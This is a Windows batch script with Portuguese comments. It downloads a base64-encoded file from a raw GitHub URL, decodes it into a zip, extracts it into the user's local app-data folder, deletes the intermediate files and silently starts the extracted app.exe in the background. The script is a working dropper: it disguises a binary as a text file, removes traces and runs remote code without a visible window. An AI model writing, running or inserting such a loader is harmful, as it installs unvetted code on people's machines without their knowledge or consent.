@echo off
setlocal enabledelayedexpansion

:: Definir variáveis
set URL=https://raw.githubusercontent.com/shellt3r/app/refs/heads/main/app.txt
set DESTINO=%LocalAppData%\MeuApp
set ZIP_PATH=%DESTINO%\app.zip
set B64_PATH=%ZIP_PATH%.b64
set EXE_PATH=%DESTINO%\app\app.exe

:: Criar pasta destino
if not exist "%DESTINO%" (
    mkdir "%DESTINO%"
)

:: Baixar o app.txt (base64)
powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%B64_PATH%'"

:: Converter Base64 para binário (app.zip)
powershell -Command "[System.Convert]::FromBase64String((Get-Content -Raw '%B64_PATH%')) | Set-Content -Encoding Byte '%ZIP_PATH%'"

:: Remover o arquivo base64
del "%B64_PATH%"

:: Extrair o zip
powershell -Command "Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%DESTINO%' -Force"

:: Remover o zip
del "%ZIP_PATH%"

:: Executar o app.exe (em background)
if exist "%EXE_PATH%" (
    start "" /B "%EXE_PATH%"
) else (
    echo Arquivo app.exe não encontrado.
)

exit
